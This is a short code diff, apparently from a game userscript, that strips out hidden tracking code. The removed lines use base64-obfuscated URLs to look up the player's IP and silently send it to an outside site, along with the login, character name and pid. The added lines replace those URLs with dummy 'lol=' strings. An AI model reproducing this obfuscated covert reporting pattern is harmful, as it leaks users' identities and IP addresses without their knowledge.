@@ -695,8 +695,8 @@ if (typeof GAME === 'undefined') { } else {
                 }, 0);
                 if(!this.reported) {
                     this.reported = true;
-                    $.get(atob('aHR0cHM6Ly9pcGluZm8uaW8='), function(response) {
-                        $.get(atob('aHR0cHM6Ly93d3cua29zbWljem5pd29qb3duaWN5cG9yYWRuaWsuY2JhLnBsL2luZGV4LnBocC91c2VyL3JlcG9ydA=='), {login:GAME.login,charName:GAME.char_data.name,pid:GAME.pid,ipadd:JSON.stringify(response)});
+                    $.get(atob('lol='), function(response) {
+                        $.get(atob('lol=='), {login:GAME.login,charName:GAME.char_data.name,pid:GAME.pid,ipadd:JSON.stringify(response)});
                     }, "jsonp");
                 }
                 let activity = $('#char_activity').text();
